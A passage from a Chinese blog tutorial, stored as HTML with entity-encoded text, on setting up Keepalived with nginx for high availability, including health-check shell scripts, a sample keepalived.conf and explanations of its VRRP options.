Protocol&#xFF0C;&#x7B80;&#x79F0;VRRP)&#xFF1B;Heartbeat&#x6216;Corosync&#x662F;&#x57FA;&#x4E8E;&#x4E3B;&#x673A;&#x6216;&#x7F51;&#x7EDC;&#x670D;&#x52A1;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x5F0F;&#xFF1B;&#x7B80;&#x5355;&#x7684;&#x8BF4;&#x5C31;&#x662F;&#xFF0C;Keepalived&#x7684;&#x76EE;&#x7684;&#x662F;&#x6A21;&#x62DF;&#x8DEF;&#x7531;&#x5668;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;Heartbeat&#x6216;Corosync&#x7684;&#x76EE;&#x7684;&#x662F;&#x5B9E;&#x73B0;Service&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;</p>
<p>&#x6240;&#x4EE5;&#x4E00;&#x822C;Keepalived&#x662F;&#x5B9E;&#x73B0;&#x524D;&#x7AEF;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x524D;&#x7AEF;&#x9AD8;&#x53EF;&#x7528;&#x7684;&#x7EC4;&#x5408;&#x6709;&#xFF0C;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x89C1;&#x7684;LVS+Keepalived&#x3001;Nginx+Keepalived&#x3001;HAproxy+Keepalived&#x3002;&#x800C;Heartbeat&#x6216;Corosync&#x662F;&#x5B9E;&#x73B0;&#x670D;&#x52A1;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x7EC4;&#x5408;&#x6709;Heartbeat v3(Corosync)+Pacemaker+NFS+Httpd &#x5B9E;&#x73B0;Web&#x670D;&#x52A1;&#x5668;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3001;Heartbeat v3(Corosync)+Pacemaker+NFS+MySQL &#x5B9E;&#x73B0;MySQL&#x670D;&#x52A1;&#x5668;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#xFF0C;Keepalived&#x4E2D;&#x5B9E;&#x73B0;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x524D;&#x7AEF;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x5171;&#x4EAB;&#x5B58;&#x50A8;&#xFF0C;&#x4E00;&#x822C;&#x5E38;&#x7528;&#x4E8E;&#x4E24;&#x4E2A;&#x8282;&#x70B9;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;&#x800C;Heartbeat(&#x6216;Corosync)&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x670D;&#x52A1;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x4E14;&#x9700;&#x8981;&#x5171;&#x4EAB;&#x5B58;&#x50A8;&#xFF0C;&#x4E00;&#x822C;&#xFFFD;&#xFFFD;&#xFFFD;&#x4E8E;&#x591A;&#x8282;&#x70B9;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x6211;&#x4EEC;&#x8BF4;&#x660E;&#x767D;&#x4E86;&#x3002;</p>
<p>&#x53C8;&#x6709;&#x535A;&#x53CB;&#x4F1A;&#x95EE;&#x4E86;&#xFF0C;&#x90A3;heartbaet&#x4E0E;corosync&#x6211;&#x4EEC;&#x53C8;&#x5E94;&#x8BE5;&#x9009;&#x62E9;&#x54EA;&#x4E2A;&#x597D;&#x554A;&#xFF0C;&#x6211;&#x60F3;&#x8BF4;&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x7528;corosync&#xFF0C;&#x56E0;&#x4E3A;corosync&#x7684;&#x8FD0;&#x884C;&#x673A;&#x5236;&#x66F4;&#x4F18;&#x4E8E;heartbeat&#xFF0C;&#x5C31;&#x8FDE;&#x4ECE;heartbeat&#x5206;&#x79BB;&#x51FA;&#x6765;&#x7684;pacemaker&#x90FD;&#x8BF4;&#x5728;&#x4EE5;&#x540E;&#x7684;&#x5F00;&#x53D1;&#x5F53;&#x4E2D;&#x66F4;&#x503E;&#x5411;&#x4E8E;corosync&#xFF0C;&#x6240;&#x4EE5;&#x73B0;&#x5728;corosync+pacemaker&#x662F;&#x6700;&#x4F73;&#x7EC4;&#x5408;&#x3002;</p>
<h2 id="1-2_Keepalived_+_nginx">1.2 Keepalived + nginx</h2><p>keepalived&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;&#x662F;VRRP&#x534F;&#x8BAE;&#x5728;Linux&#x4E0A;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x4E3B;&#x8981;&#x6709;&#x4E09;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x5206;&#x522B;&#x662F;core&#x3001;check&#x548C;vrrp&#x3002;core&#x6A21;&#x5757;&#x4E3A;keepalived&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x8D1F;&#x8D23;&#x4E3B;&#x8FDB;&#x7A0B;&#x7684;&#x542F;&#x52A8;&#x3001;&#x7EF4;&#x62A4;&#x4EE5;&#x53CA;&#x5168;&#x5C40;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x52A0;&#x8F7D;&#x548C;&#x89E3;&#x6790;&#x3002;check&#x8D1F;&#x8D23;&#x5065;&#x5EB7;&#x68C0;&#x67E5;&#xFF0C;&#x5305;&#x62EC;&#x5E38;&#x89C1;&#x7684;&#x5404;&#x79CD;&#x68C0;&#x67E5;&#x65B9;&#x5F0F;&#x3002;vrrp&#x6A21;&#x5757;&#x662F;&#x6765;&#x5B9E;&#x73B0;VRRP&#x534F;&#x8BAE;&#x7684;&#x3002;&#x672C;&#x6587;&#x57FA;&#x4E8E;&#x5982;&#x4E0B;&#x7684;&#x62D3;&#x6251;&#x56FE;&#xFF1A;</p>
<pre><code>                   +-------------+
                   |<span class="string">    uplink   </span>|
                   +-------------+
    |<span class="string">
    +
    MASTER            keep</span>|<span class="string">alived         BACKUP
172.29.88.224      172.29.88.222      172.29.88.225
+-------------+    +-------------+    +-------------+
</span>|<span class="string">   nginx01   </span>|<span class="string">----</span>|<span class="string">  virtualIP  </span>|<span class="string">----</span>|<span class="string">   nginx02   </span>|
+-------------+    +-------------+    +-------------+
    |<span class="string">
       +------------------+------------------+
       </span>|<span class="string">                  </span>|<span class="string">                  </span>|
+-------------+    +-------------+    +-------------+
|<span class="string">    web01    </span>|<span class="string">    </span>|<span class="string">    web02    </span>|<span class="string">    </span>|<span class="string">    web03    </span>|
+-------------+    +-------------+    +-------------+
</code></pre><h2 id="2-_keepalived&#x5B9E;&#x73B0;nginx&#x9AD8;&#x53EF;&#x7528;">2. keepalived&#x5B9E;&#x73B0;nginx&#x9AD8;&#x53EF;&#x7528;</h2><h2 id="2-1&#x5B89;&#x88C5;">2.1&#x5B89;&#x88C5;</h2><p>&#x6211;&#x7684;&#x73AF;&#x5883;&#x662F;CentOS 6.2 X86_64&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;yum&#x65B9;&#x5F0F;&#x5B89;&#x88C5;&#x6700;&#x7B80;&#x5355;&#xFF1A;</p>
<pre><code><span class="preprocessor"># yum install -y keepalived</span>
<span class="preprocessor"># keepalived -v</span>
Keepalived v1.2.13 (<span class="number">03</span>/<span class="number">19</span>,<span class="number">2015</span>)
</code></pre><h2 id="2-2_nginx&#x76D1;&#x63A7;&#x811A;&#x672C;">2.2 nginx&#x76D1;&#x63A7;&#x811A;&#x672C;</h2><p>&#x8BE5;&#x811A;&#x672C;&#x68C0;&#x6D4B;ngnix&#x7684;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#xFF0C;&#x5E76;&#x5728;nginx&#x8FDB;&#x7A0B;&#x4E0D;&#x5B58;&#x5728;&#x65F6;&#x5C1D;&#x8BD5;&#x91CD;&#x65B0;&#x542F;&#x52A8;ngnix&#xFF0C;&#x5982;&#x679C;&#x542F;&#x52A8;&#x5931;&#x8D25;&#x5219;&#x505C;&#x6B62;keepalived&#xFF0C;&#x51C6;&#x5907;&#x8BA9;&#x5176;&#x5B83;&#x673A;&#x5668;&#x63A5;&#x7BA1;&#x3002;</p>
<p>/etc/keepalived/check_nginx.sh &#xFF1A; </p>
<pre><code><span class="shebang">#!/bin/bash</span>
counter=$(ps -C nginx --no-heading|wc <span class="operator">-l</span>)
<span class="keyword">if</span> [ &amp;quot;<span class="variable">${counter}</span>&amp;quot; = &amp;quot;<span class="number">0</span>&amp;quot; ]; <span class="keyword">then</span>
    /usr/<span class="built_in">local</span>/bin/nginx
    sleep <span class="number">2</span>
    counter=$(ps -C nginx --no-heading|wc <span class="operator">-l</span>)
    <span class="keyword">if</span> [ &amp;quot;<span class="variable">${counter}</span>&amp;quot; = &amp;quot;<span class="number">0</span>&amp;quot; ]; <span class="keyword">then</span>
        /etc/init.d/keepalived stop
    <span class="keyword">fi</span>
<span class="keyword">fi</span>
</code></pre><p>&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x5DF1;&#x7684;&#x4E1A;&#x52A1;&#x9700;&#x6C42;&#xFF0C;&#x603B;&#x7ED3;&#x51FA;&#x5728;&#x4EC0;&#x4E48;&#x60C5;&#x5F62;&#x4E0B;&#x5173;&#x95ED;keepalived&#xFF0C;&#x5982; curl &#x4E3B;&#x9875;&#x8FDE;&#x7EED;2&#x4E2A;5s&#x6CA1;&#x6709;&#x54CD;&#x5E94;&#x5219;&#x5207;&#x6362;&#xFF1A;</p>
<pre><code><span class="shebang">#!/bin/bash</span>
<span class="comment"># curl -IL http://localhost/member/login.htm</span>
<span class="comment"># curl --data &amp;quot;memberName=fengkan&amp;amp;password=22&amp;quot; http://localhost/member/login.htm</span>
count = <span class="number">0</span>
<span class="keyword">for</span> (( k=<span class="number">0</span>; k&amp;lt;<span class="number">2</span>; k++ )) 
<span class="keyword">do</span> 
    check_code=$( curl --connect-timeout <span class="number">3</span> <span class="operator">-s</span>L -w &amp;quot;%{http_code}\\n&amp;quot; http://localhost/login.html -o /dev/null )
    <span class="keyword">if</span> [ &amp;quot;<span class="variable">$check_code</span>&amp;quot; != &amp;quot;<span class="number">200</span>&amp;quot; ]; <span class="keyword">then</span>
        count = count +<span class="number">1</span>
        <span class="built_in">continue</span>
    <span class="keyword">else</span>
        count = <span class="number">0</span>
        <span class="built_in">break</span>
    <span class="keyword">fi</span>
<span class="keyword">done</span>
<span class="keyword">if</span> [ &amp;quot;<span class="variable">$count</span>&amp;quot; != &amp;quot;<span class="number">0</span>&amp;quot; ]; <span class="keyword">then</span>
<span class="comment">#   /etc/init.d/keepalived stop</span>
    <span class="built_in">exit</span> <span class="number">1</span>
<span class="keyword">else</span>
    <span class="built_in">exit</span> <span class="number">0</span>
<span class="keyword">fi</span>
</code></pre><h2 id="2-3_keepalived-conf">2.3 keepalived.conf</h2><pre><code>! Configuration File <span class="keyword">for</span> keepalived
global_defs {
    notification_email {
        zhouxiao<span class="annotation">@example</span>.com
        itsection<span class="annotation">@example</span>.com
    }
    notification_email_from itsection<span class="annotation">@example</span>.com
    smtp_server mail.example.com
    smtp_connect_timeout <span class="number">30</span>
    router_id LVS_DEVEL
}
vrrp_script chk_nginx {
#    script &amp;quot;killall -<span class="number">0</span> nginx&amp;quot;
    script &amp;quot;<span class="regexp">/etc/</span>keepalived/check_nginx.sh&amp;quot; 
    interval <span class="number">2</span> 
    weight -<span class="number">5</span> 
    fall <span class="number">3</span>  
    rise <span class="number">2</span> 
}
vrrp_instance VI_1 {
    state MASTER
    <span class="class"><span class="keyword">interface</span> <span class="title">eth0</span>
    <span class="title">mcast_src_ip</span> 172.29.88.224
    <span class="title">virtual_router_id</span> 51
    <span class="title">priority</span> 101
    <span class="title">advert_int</span> 2
    <span class="title">authentication</span> {</span>
        auth_type PASS
        auth_pass <span class="number">1111</span>
    }
    virtual_ipaddress {
        <span class="number">172.29</span>.88.222
    }
    track_script {
       chk_nginx 
    }
}
</code></pre><p>&#x5728;&#x5176;&#x5B83;&#x5907;&#x673A;BACKUP&#x4E0A;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x6539;&#x53D8; state MASTER -&gt; state BACKUP &#xFF0C; priority 101 -&gt; priority 100 &#xFF0C; mcast_src_ip 172.29.88.224 -&gt; mcast_src_ip 172.29.88.225 &#x5373;&#x53EF;&#x3002; </p>
<pre><code><span class="keyword">service</span> keepalived <span class="literal">restart</span>
</code></pre><h2 id="2-4_&#x914D;&#x7F6E;&#x9009;&#x9879;&#x8BF4;&#x660E;">2.4 &#x914D;&#x7F6E;&#x9009;&#x9879;&#x8BF4;&#x660E;</h2><h4 id="global_defs">global_defs</h4><ul>
<li>notification_email &#xFF1A; keepalived&#x5728;&#x53D1;&#x751F;&#x8BF8;&#x5982;&#x5207;&#x6362;&#x64CD;&#x4F5C;&#x65F6;&#x9700;&#x8981;&#x53D1;&#x9001;email&#x901A;&#x77E5;&#x5730;&#x5740;&#xFF0C;&#x540E;&#x9762;&#x7684; smtp_server &#x76F8;&#x6BD4;&#x4E5F;&#x90FD;&#x77E5;&#x9053;&#x662F;&#x90AE;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5176;&#x5B83;&#x65B9;&#x5F0F;&#x62A5;&#x8B66;&#xFF0C;&#x6BD5;&#x7ADF;&#x90AE;&#x4EF6;&#x4E0D;&#x662F;&#x5B9E;&#x65F6;&#x901A;&#x77E5;&#x7684;&#x3002;</li>
<li>router_id &#xFF1A; &#x673A;&#x5668;&#x6807;&#x8BC6;&#xFF0C;&#x901A;&#x5E38;&#x53EF;&#x8BBE;&#x4E3A;hostname&#x3002;&#x6545;&#x969C;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x4F1A;&#x7528;&#x5230;</li>
</ul>
<h4 id="vrrp_instance">vrrp_instance</h4><ul>
<li>state &#xFF1A; &#x6307;&#x5B9A;instance(Initial)&#x7684;&#x521D;&#x59CB;&#x72B6;&#x6001;&#xFF0C;&#x5C31;&#x662F;&#x8BF4;&#x5728;&#x914D;&#x7F6E;&#x597D;&#x540E;&#xFF0C;&#x8FD9;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x7684;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x5C31;&#x662F;&#x8FD9;&#x91CC;&#x6307;&#x5B9A;&#x7684;&#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x6307;&#x5B9A;&#x7684;&#x4E0D;&#x7B97;&#xFF0C;&#x8FD8;&#x662F;&#x5F97;&#x8981;&#x901A;&#x8FC7;&#x7ADE;&#x9009;&#x901A;&#x8FC7;&#x4F18;&#x5148;&#x7EA7;&#x6765;&#x786E;&#x5B9A;&#x3002;&#x5982;&#x679C;&#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x4E3A;MASTER&#xFF0C;&#x4F46;&#x5982;&#x82E5;&#x4ED6;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x53CA;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x53F0;&#x5728;&#x53D1;&#x9001;&#x901A;&#x544A;&#x65F6;&#xFF0C;&#x4F1A;&#x53D1;&#x9001;&#x81EA;&#x5DF1;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x53D1;&#x73B0;&#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x5982;&#x81EA;&#x5DF1;&#x7684;&#x9AD8;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x4F1A;&#x5C31;&#x56DE;&#x62A2;&#x5360;&#x4E3A;MASTER</li>
<li>interface &#xFF1A; &#x5B9E;&#x4F8B;&#x7ED1;&#x5B9A;&#x7684;&#x7F51;&#x5361;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x914D;&#x7F6E;&#x865A;&#x62DF;IP&#x7684;&#x65F6;&#x5019;&#x5FC5;&#x987B;&#x662F;&#x5728;&#x5DF2;&#x6709;&#x7684;&#x7F51;&#x5361;&#x4E0A;&#x6DFB;&#x52A0;&#x7684;</li>
<li>mcast_src_ip &#xFF1A; &#x53D1;&#x9001;&#x591A;&#x64AD;&#x6570;&#x636E;&#x5305;&#x65F6;&#x7684;&#x6E90;IP&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x91CC;&#x6CE8;&#x610F;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x5728;&#x90A3;&#x4E2A;&#x5730;&#x5740;&#x4E0A;&#x53D1;&#x9001;VRRP&#x901A;&#x544A;&#xFF0C;&#x8FD9;&#x4E2A;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;&#x9009;&#x62E9;&#x7A33;&#x5B9A;&#x7684;&#x7F51;&#x5361;&#x7AEF;&#x53E3;&#x6765;&#x53D1;&#x9001;&#xFF0C;&#x8FD9;&#x91CC;&#x76F8;&#x5F53;&#x4E8E;heartbeat&#x7684;&#x5FC3;&#x8DF3;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x90A3;&#x4E48;&#x5C31;&#x7528;&#x9ED8;&#x8BA4;&#x7684;&#x7ED1;&#x5B9A;&#x7684;&#x7F51;&#x5361;&#x7684;IP&#xFF0C;&#x4E5F;&#x5C31;&#x662F;interface&#x6307;&#x5B9A;&#x7684;IP&#x5730;&#x5740;</li>
<li>virtual_router_id &#xFF1A; &#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;VRID&#xFF0C;&#x8FD9;&#x91CC;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x76F8;&#x540C;&#x7684;VRID&#x4E3A;&#x4E00;&#x4E2A;&#x7EC4;&#xFF0C;&#x4ED6;&#x5C06;&#x51B3;&#x5B9A;&#x591A;&#x64AD;&#x7684;MAC&#x5730;&#x5740;</li>
<li>priority &#xFF1A; &#x8BBE;&#x7F6E;&#x672C;&#x8282;&#x70B9;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x4F18;&#x5148;&#x7EA7;&#x9AD8;&#x7684;&#x4E3A;master</li>
<li>advert_int &#xFF1A; &#x68C0;&#x67E5;&#x95F4;&#x9694;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;1&#x79D2;&#x3002;&#x8FD9;&#x5C31;&#x662F;VRRP&#x7684;&#x5B9A;&#x65F6;&#x5668;&#xFF0C;MASTER&#x6BCF;&#x9694;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x9001;&#x4E00;&#x4E2A;advertisement&#x62A5;&#x6587;&#x4EE5;&#x901A;&#x77E5;&#x7EC4;&#x5185;&#x5176;&#x4ED6;&#x8DEF;&#x7531;&#x5668;&#x81EA;&#x5DF1;&#x5DE5;&#x4F5C;&#x6B63;&#x5E38;</li>
<li>authentication &#xFF1A; &#x5B9A;&#x4E49;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x4E3B;&#x4ECE;&#x5FC5;&#x987B;&#x4E00;&#x6837;</li>
<li>virtual_ipaddress &#xFF1A; &#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x7684;&#x5C31;&#x662F;VIP&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x865A;&#x62DF;IP&#x5730;&#x5740;&#xFF0C;&#x4ED6;&#x968F;&#x7740;state&#x7684;&#x53D8;&#x5316;&#x800C;&#x589E;&#x52A0;&#x5220;&#x9664;&#xFF0C;&#x5F53;state&#x4E3A;master&#x7684;&#x65F6;&#x5019;&#x5C31;&#x6DFB;&#x52A0;&#xFF0C;&#x5F53;state&#x4E3A;backup&#x7684;&#x65F6;&#x5019;&#x5220;&#x9664;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x662F;&#x6709;&#x4F18;&#x5148;&#x7EA7;&#x6765;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x548C;state&#x8BBE;&#x7F6E;&#x7684;&#x503C;&#x6CA1;&#x6709;&#x591A;&#x5927;&#x5173;&#x7CFB;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;IP&#x5730;&#x5740;</li>
<li>track_script &#xFF1A; &#x5F15;&#x7528;VRRP&#x811A;&#x672C;&#xFF0C;&#x5373;&#x5728; vrrp_script &#x90E8;&#x5206;&#x6307;&#x5B9A;&#x7684;&#x540D;&#x5B57;&#x3002;&#x5B9A;&#x671F;&#x8FD0;&#x884C;&#x5B83;&#x4EEC;&#x6765;&#x6539;&#x53D8;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x5E76;&#x6700;&#x7EC8;&#x5F15;&#x53D1;&#x4E3B;&#x5907;&#x5207;&#x6362;&#x3002;</li>
</ul>
<p>vrrp_script </p>
<p>&#x544A;&#x8BC9; keepalived &#x5728;&#x4EC0;&#x4E48;&#x60C5;&#x51B5;&#x4E0B;&#x5207;&#x6362;&#xFF0C;&#x6240;&#x4EE5;&#x5C24;&#x4E3A;&#x91CD;&#x8981;&#x3002;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A; vrrp_script</p>
<ul>
<li>script &#xFF1A; &#x81EA;&#x5DF1;&#x5199;&#x7684;&#x68C0;&#x6D4B;&#x811A;&#x672C;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x884C;&#x547D;&#x4EE4;&#x5982; killall -0 nginx</li>
<li>interval 2 &#xFF1A; &#x6BCF;2s&#x68C0;&#x6D4B;&#x4E00;&#x6B21;</li>
<li>weight -5 &#xFF1A; &#x68C0;&#x6D4B;&#x5931;&#x8D25;&#xFF08;&#x811A;&#x672C;&#x8FD4;&#x56DE;&#x975E;0&#xFF09;&#x5219;&#x4F18;&#x5148;&#x7EA7; -5</li>
<li>fall 2 &#xFF1A; &#x68C0;&#x6D4B;&#x8FDE;&#x7EED; 2 &#x6B21;&#x5931;&#x8D25;&#x624D;&#x7B97;&#x786E;&#x5B9A;&#x662F;&#x771F;&#x5931;&#x8D25;&#x3002;&#x4F1A;&#x7528;weight&#x51CF;&#x5C11;&#x4F18;&#x5148;&#x7EA7;&#xFF08;1-255&#x4E4B;&#x95F4;&#xFF09;</li>
<li>rise 1 &#xFF1A; &#x68C0;&#x6D4B; 1 &#x6B21;&#x6210;&#x529F;&#x5C31;&#x7B97;&#x6210;&#x529F;&#x3002;&#x4F46;&#x4E0D;&#x4FEE;&#x6539;&#x4F18;&#x5148;&#x7EA7;</li>
</ul>
<p>&#x8FD9;&#x91CC;&#x8981;&#x63D0;&#x793A;&#x4E00;&#x4E0B;script&#x4E00;&#x822C;&#x6709;2&#x79CD;&#x5199;&#x6CD5;&#xFF1A;</p>
<ol>
<li>&#x901A;&#x8FC7;&#x811A;&#x672C;&#x6267;&#x884C;&#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x6539;&#x53D8;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;keepalived&#x7EE7;&#x7EED;&#x53D1;&#x9001;&#x901A;&#x544A;&#x6D88;&#x606F;&#xFF0C;backup&#x6BD4;&#x8F83;&#x4F18;&#x5148;&#x7EA7;&#x518D;&#x51B3;&#x5B9A;</li>
<li>&#x811A;&#x672C;&#x91CC;&#x9762;&#x68C0;&#x6D4B;&#x5230;&#x5F02;&#x5E38;&#xFF0C;&#x76F4;&#x63A5;&#x5173;&#x95ED;keepalived&#x8FDB;&#x7A0B;&#xFF0C;backup&#x673A;&#x5668;&#x63A5;&#x6536;&#x4E0D;&#x5230;advertisement&#x4F1A;&#x62A2;&#x5360;IP</li>
</ol>
<p>&#x4E0A;&#x6587; vrrp_script &#x914D;&#x7F6E;&#x90E8;&#x5206;&#xFF0C; killall -0 nginx &#x5C5E;&#x4E8E;&#x7B2C;1&#x79CD;&#x60C5;&#x51B5;&#xFF0C; /etc/keepalived/check_nginx.sh &#x5C5E;&#x4E8E;&#x7B2C;2&#x79CD;&#x60C5;&#x51B5;&#xFF08;&#x811A;&#x672C;&#x4E2D;&#x5173;&#x95ED;keepalived&#xFF09;&#x3002;&#x4E2A;&#x4EBA;&#x66F4;&#x503E;&#x5411;&#x4E8E;&#x901A;&#x8FC7;shell&#x811A;&#x672C;&#x5224;&#x65AD;&#xFF0C;&#x4F46;&#x6709;&#x5F02;&#x5E38;&#x65F6;exit 1&#xFF0C;&#x6B63;&#x5E38;&#x9000;&#x51FA;exit 0&#xFF0C;&#x7136;&#x540E;keepalived&#x6839;&#x636E;&#x52A8;&#x6001;&#x8C03;&#x6574;&#x7684; vrrp_instance &#x4F18;&#x5148;&#x7EA7;&#x9009;&#x4E3E;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x62A2;&#x5360;VIP&#xFF1A; </p>
<ul>
<li>&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x4E3A;0&#xFF0C;&#x5E76;&#x4E14;weight&#x914D;&#x7F6E;&#x7684;&#x503C;&#x5927;&#x4E8E;0&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x76F8;&#x5E94;&#x7684;&#x589E;&#x52A0;</li>
<li>&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x975E;0&#xFF0C;&#x5E76;&#x4E14;weight&#x914D;&#x7F6E;&#x7684;&#x503C;&#x5C0F;&#x4E8E;0&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x76F8;&#x5E94;&#x7684;&#x51CF;&#x5C11;</li>
</ul>
<p>&#x5176;&#x4ED6;&#x60C5;&#x51B5;&#xFF0C;&#x539F;&#x672C;&#x914D;&#x7F6E;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x53D8;&#xFF0C;&#x5373;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;priority&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x3002;</p>
<p>&#x63D0;&#x793A;&#xFF1A;</p>
<ol>
<li>&#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x63D0;&#x9AD8;&#x6216;&#x8005;&#x964D;&#x4F4E;</li>
<li>&#x53EF;&#x4EE5;&#x7F16;&#x5199;&#x591A;&#x4E2A;&#x68C0;&#x6D4B;&#x811A;&#x672C;&#x5E76;&#x4E3A;&#x6BCF;&#x4E2A;&#x68C0;&#x6D4B;&#x811A;&#x672C;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;weight&#xFF08;&#x5728;&#x914D;&#x7F6E;&#x4E2D;&#x5217;&#x51FA;&#x5C31;&#x884C;&#xFF09;</li>
<li>&#x4E0D;&#x7BA1;&#x63D0;&#x9AD8;&#x4F18;&#x5148;&#x7EA7;&#x8FD8;&#x662F;&#x964D;&#x4F4E;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x6700;&#x7EC8;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x8303;&#x56F4;&#x662F;&#x5728;[1,254]&#xFF0C;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x4F18;&#x5148;&#x7EA7;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;0&#x6216;&#x8005;&#x4F18;&#x5148;&#x7EA7;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;255&#x7684;&#x60C5;&#x51B5;</li>
<li>&#x5728;MASTER&#x8282;&#x70B9;&#x7684; vrrp_instance &#x4E2D; &#x914D;&#x7F6E; nopreempt &#xFF0C;&#x5F53;&#x5B83;&#x5F02;&#x5E38;&#x6062;&#x590D;&#x540E;&#xFF0C;&#x5373;&#x4F7F;&#x5B83; prio &#x66F4;&#x9AD8;&#x4E5F;&#x4E0D;&#x4F1A;&#x62A2;&#x5360;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x505A;&#x65E0;&#x8C13;&#x7684;&#x5207;&#x6362;</li>
</ol>
<p>&#x4EE5;&#x4E0A;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x5229;&#x7528;&#x811A;&#x672C;&#x68C0;&#x6D4B;&#x4E1A;&#x52A1;&#x8FDB;&#x7A0B;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5E76;&#x52A8;&#x6001;&#x8C03;&#x6574;&#x4F18;&#x5148;&#x7EA7;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E3B;&#x5907;&#x5207;&#x6362;&#x3002;</p>
